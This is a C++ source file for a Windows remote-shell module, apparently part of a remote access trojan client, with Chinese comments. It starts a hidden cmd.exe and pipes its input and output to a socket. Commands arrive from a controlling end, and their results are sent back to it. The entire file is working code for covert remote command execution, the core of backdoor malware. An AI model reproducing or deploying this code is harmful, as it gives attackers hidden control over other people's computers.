#include "pch.h"
#include "ModuleShellRemote.h"
#include "SocketClient.h"


CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {
	// 手动重置信号
	m_hRecvPacketShellRemoteCloseEvent = CreateEvent(NULL, true, false, NULL);
	m_hSendPacketShellRemoteConnectEvent = CreateEvent(NULL, true, false, NULL);

	// 执行shell的互斥锁
	InitializeCriticalSection(&m_ExecuteCs);

	m_hRead = NULL;
	m_hWrite = NULL;

	m_hCmdProcess = NULL;
	m_hCmdMainThread = NULL;
}


CModuleShellRemote::~CModuleShellRemote() {
	if (m_hCmdProcess != NULL) {
		TerminateProcess(m_hCmdProcess, 0);
		WaitForSingleObject(m_hCmdProcess, INFINITE);
		CloseHandle(m_hCmdProcess);
		m_hCmdProcess = NULL;
	}
	if (m_hCmdMainThread != NULL) {
		TerminateThread(m_hCmdMainThread, 0);
		WaitForSingleObject(m_hCmdMainThread, INFINITE);
		CloseHandle(m_hCmdMainThread);
		m_hCmdMainThread = NULL;
	}

	if (m_hRecvPacketShellRemoteCloseEvent != NULL) {
		CloseHandle(m_hRecvPacketShellRemoteCloseEvent);
		m_hRecvPacketShellRemoteCloseEvent = NULL;
	}
	if (m_hSendPacketShellRemoteConnectEvent != NULL) {
		CloseHandle(m_hSendPacketShellRemoteConnectEvent);
		m_hSendPacketShellRemoteConnectEvent = NULL;
	}

	DeleteCriticalSection(&m_ExecuteCs);

	// CloseHandle在RunCmdProcessThreadFunc中进行
	m_hRead = NULL;
	m_hWrite = NULL;
}



void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);					// 记得在线程函数里面delete这个包

	switch (pPacketCopy->m_PacketHead.wCommandId) {
		
	case SHELL_EXECUTE: {
		SHELL_REMOTE_EXECUTE_THREAD_PARAM* pThreadParam = new SHELL_REMOTE_EXECUTE_THREAD_PARAM(this, pPacketCopy);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OnRecvPacketShellRemoteExecute, (LPVOID)pThreadParam, 0, NULL);
		// 最终发现，创建个子线程运行ExecuteShell函数就能发包了。我猜测应该也和OnReceive回调中
		// 不要绘制对话框一个原因，因为ExecuteShell函数内有ReadFile,有管道交互等大量IO操作。
		break;
	}
		
	case SHELL_EXECUTE_RESULT:
		break;

	case SHELL_EXECUTE_RESULT_OVER:
		break;

	case SHELL_CLOSE:
		SetEvent(m_hRecvPacketShellRemoteCloseEvent);
		m_pChildSocketClient->SendPacket(SHELL_CLOSE, NULL, 0);
		break;
	}
}



VOID CModuleShellRemote::RunCmdProcess() {
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)this->RunCmdProcessThreadFunc, this, 0, NULL);
}


DWORD WINAPI CModuleShellRemote::RunCmdProcessThreadFunc(LPVOID lParam)
{
	CModuleShellRemote* pThis = (CModuleShellRemote*)lParam;

	STARTUPINFO					si;
	PROCESS_INFORMATION			pi;
	SECURITY_ATTRIBUTES			sa;

	HANDLE						hRead = NULL;
	HANDLE						hWrite = NULL;
	HANDLE						hRead2 = NULL;
	HANDLE						hWrite2 = NULL;

	WCHAR						pszSystemPath[MAX_PATH] = { 0 };
	WCHAR						pszCommandPath[MAX_PATH] = { 0 };

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道
	if (!CreatePipe(&hRead, &hWrite2, &sa, 0)) {
		goto Clean;
	}
	if (!CreatePipe(&hRead2, &hWrite, &sa, 0)) {
		goto Clean;
	}

	pThis->m_hRead = hRead;
	pThis->m_hWrite = hWrite;

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdInput = hRead2;
	si.hStdError = hWrite2;
	si.hStdOutput = hWrite2;	
	si.wShowWindow  =SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	// 获取系统目录
	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath)); 
	// 拼接成启动cmd.exe的命令
	StringCbPrintf(pszCommandPath, MAX_PATH, L"%s\\cmd.exe", pszSystemPath);

	// 创建CMD进程
	if (!CreateProcess(pszCommandPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		DebugPrint("error = 0x%x\n", GetLastError());
		goto Clean;
	}
	pThis->m_hCmdProcess = pi.hProcess;
	pThis->m_hCmdMainThread = pi.hThread;

	// 创建好进程后就向主控端发送CONNECT响应包。
	pThis->m_pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
	SetEvent(pThis->m_hSendPacketShellRemoteConnectEvent);

	// 等待关闭
	WaitForSingleObject(pThis->m_pChildSocketClient->m_hChildSocketClientExitEvent, INFINITE);

Clean:
	//释放句柄
	if (hRead != NULL) {
		CloseHandle(hRead);
		hRead = NULL;
		pThis->m_hRead = NULL;
	}
	if (hRead2 != NULL) {
		CloseHandle(hRead2);
		hRead2 = NULL;
	}
	if (hWrite != NULL) {
		CloseHandle(hWrite);
		hWrite = NULL;
		pThis->m_hWrite = NULL;
	}
	if (hWrite2 != NULL) {
		CloseHandle(hWrite2);
		hWrite2 = NULL;
	}
	return 0;
}


// 本函数只将要执行的命令写入CMD进程的缓冲区，执行结果由另一线程负责循环读取并发送
VOID WINAPI CModuleShellRemote::OnRecvPacketShellRemoteExecute(LPVOID lParam) {
	SHELL_REMOTE_EXECUTE_THREAD_PARAM* pThreadParam = (SHELL_REMOTE_EXECUTE_THREAD_PARAM*)lParam;
	CModuleShellRemote* pThis = pThreadParam->m_pThis;
	CPacket* pPacket = pThreadParam->m_pPacket;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
	delete pThreadParam;

	CHAR pszCommand[SHELL_MAX_LENGTH];
	DWORD dwBytesWritten = 0;

	EnterCriticalSection(&pThis->m_ExecuteCs);

	WideCharToMultiByte(CP_ACP, 0, (PWSTR)pPacket->m_pbPacketBody, -1, pszCommand, SHELL_MAX_LENGTH, NULL, NULL);
	strcat_s(pszCommand, "\r\n");
	if (pThis->m_hWrite != NULL) {
		WriteFile(pThis->m_hWrite, pszCommand, strlen(pszCommand), &dwBytesWritten, NULL);
	}

	LeaveCriticalSection(&pThis->m_ExecuteCs);

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}
}


VOID CModuleShellRemote::LoopReadAndSendCommandReuslt() {
	BYTE SendBuf[SEND_BUFFER_MAX_LENGTH];
	DWORD dwBytesRead = 0;
	DWORD dwTotalBytesAvail = 0;

	while (m_hRead != NULL)
	{
		// 触发关闭事件时跳出循环，结束线程。
		if (WAIT_OBJECT_0 == WaitForSingleObject(m_pChildSocketClient->m_hChildSocketClientExitEvent, 0)) {
			break;
		}

		while (true) {
			// 和ReadFile类似，但是这个不会删掉已读取的缓冲区数据，而且管道中没有数据时可以立即返回。
			// 而在管道中没有数据时，ReadFile会阻塞掉，所以我用PeekNamedPipe来判断管道中有数据，以免阻塞。
			PeekNamedPipe(m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, &dwTotalBytesAvail, NULL);
			if (dwBytesRead == 0) {
				//m_pChildSocketClient->SendPacket(SHELL_EXECUTE_RESULT_OVER, NULL, 0);
				break;
			}
			dwBytesRead = 0;
			dwTotalBytesAvail = 0;

			// 我的需求是取一次运行结果就请一次已读取的缓冲区，所以PeekNamedPipe仅用来判断管道是否为空，取数据还是用ReadFile
			BOOL bReadSuccess = ReadFile(m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, NULL);

			// TODO 好像没用
			if (WAIT_OBJECT_0 != WaitForSingleObject(m_pChildSocketClient->m_hChildSocketClientExitEvent, 0)) {
				m_pChildSocketClient->SendPacket(SHELL_EXECUTE_RESULT, (PBYTE)SendBuf, dwBytesRead);
			}

			memset(SendBuf, 0, sizeof(SendBuf));
			dwBytesRead = 0;
			Sleep(100);
		}
	}
}